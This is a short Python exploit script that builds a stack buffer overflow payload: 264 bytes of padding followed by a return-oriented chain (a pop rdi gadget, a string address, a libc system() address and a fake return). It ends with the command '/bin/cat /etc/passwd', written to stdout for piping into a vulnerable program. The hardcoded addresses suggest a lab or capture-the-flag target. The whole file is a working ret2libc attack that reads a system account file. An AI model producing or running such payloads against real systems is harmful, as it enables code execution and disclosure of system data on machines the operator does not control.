#!/usr/bin/env python3

import sys

oflow = b'A' * 264

string = b"/bin/cat /etc/passwd\0"

frames = [
        # system	(0x 7f ff f7 a5 23 a0)
	# fake return	(0x 00 00 de ad be ef)
	# pop rdi; ret	(0x 00 00 00 40 08 03)
	# string_addr	(0x 7f ff ff ff e8 38)
        [ b'\x03\x08\x40\x00', b'\x00\x00\x00\x00',
	  b'\x38\xe8\xff\xff', b'\xff\x7f\x00\x00',
	  b'\xa0\x23\xa5\xf7', b'\xff\x7f\x00\x00',
	  b'\xef\xbe\xad\xde', b'\x00\x00\x00\x00' ]
        ]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
